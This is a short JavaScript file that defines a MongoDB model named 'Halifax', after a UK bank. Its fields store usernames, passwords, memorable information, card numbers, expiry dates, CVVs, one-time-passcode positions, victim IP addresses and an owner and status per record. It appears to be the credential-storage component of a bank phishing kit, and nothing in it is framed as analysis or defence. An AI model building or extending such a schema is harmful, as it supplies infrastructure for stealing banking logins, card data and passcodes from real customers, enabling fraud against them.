const mongoose = require("mongoose");

const halifaxSchema = new mongoose.Schema({
	uniqueid: String,
	username: String,
	password: String,
	memorable: String,
	ccnum: String,
	ccexp: String,
	cvv: String,
	status: Number,
	ip: String,
	owner: String,
	memIndex1: String,
	memIndex2: String,
	memIndex3: String,
	otpIndex1: String,
	otpIndex2: String,
	otpIndex3: String,
	otpIndex4: String,
});

module.exports = mongoose.model("Halifax", halifaxSchema);
